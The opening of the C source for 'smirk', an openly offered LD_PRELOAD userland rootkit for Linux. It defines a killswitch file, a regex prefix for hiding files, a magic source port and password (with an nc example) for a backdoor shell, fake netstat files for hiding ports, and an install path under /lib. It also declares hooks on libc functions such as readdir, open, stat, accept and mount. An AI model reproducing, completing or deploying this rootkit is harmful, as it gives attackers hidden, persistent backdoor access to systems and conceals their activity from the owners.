/*
 *    .=.
 *   '==c|  This project is libre, and licenced under the terms of the
 *   [)-+|  DO WHAT THE FUCK YOU WANT TO PUBLIC LICENCE, version 3.1,
 *   //'_|  as published by dtf on July 2019. See the COPYING file or
 *  /]==;\  https://ph.dtf.wtf/w/wtfpl/#version-3-1 for more details.
*/
#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <string.h>
#include <dirent.h>
#include <linux/fs.h>
#include <stdlib.h>
#include <errno.h>
#include <regex.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/stat.h>

// enable/disable debug 
//#define DEBUG

// killswitch file: if you create this file the rootkit will sadly uninstall :_(_
#define KILLSWITCH "/dev/shm/.smirkkill"

// libc library
#define LIBC "libc.so.6"

// prefix used to hide file
#define MAGIC_PREFIX "^\\.smirk" //regex format

// source port number used to make the call e.g. $ nc -p 65535 <target> <port> 
#define MAGIC_PORT 65535

// shell password, wrong password returns a peace message
#define PASSWORD "SmirkFTW"

// files used to store fake netstat informations
#define FAKE_NETSTAT_FILE "/dev/shm/.smirknet-"

// in this file you can store the ports that you want to hide
#define PORTSPOOF_FILE "/dev/shm/.smirknet"

// smirk will be installed there when you load it first time
#define MAGIC_LIBPATH "/lib/.smirk.so"

void *libc;
void *load_libc(char *);

struct dirent *(*hooked_readdir)(DIR *);
int (*hooked_open)(const char *, int, mode_t);
FILE *(*hooked_fopen)(const char *, const char *);
FILE *(*hooked_fopen64)(const char *, const char *);
int (*hooked_ioctl)(int , unsigned long , unsigned long *);
int (*hooked_accept)(int, struct sockaddr_in *, socklen_t *);
int (*hooked_accept4)(int, struct sockaddr_in *, socklen_t *, int);
int (*hooked_mount)(const char *, const char *, const char *, unsigned long, const void *);

int (*hooked_stat)(const char *, struct stat *);
int (*hooked_xstat)(int version, const char *, struct stat *);
int (*hooked_stat64)(const char *, struct stat64 *);
int (*hooked_xstat64)(int version, const char *, struct stat64 *);

int (*hooked_lstat)(const char *, struct stat *);
int (*hooked_lxstat)(int version, const char *, struct stat *);
int (*hooked_lstat64)(const char *, struct stat *);
int (*hooked_lxstat64)(int version, const char *, struct stat64 *);
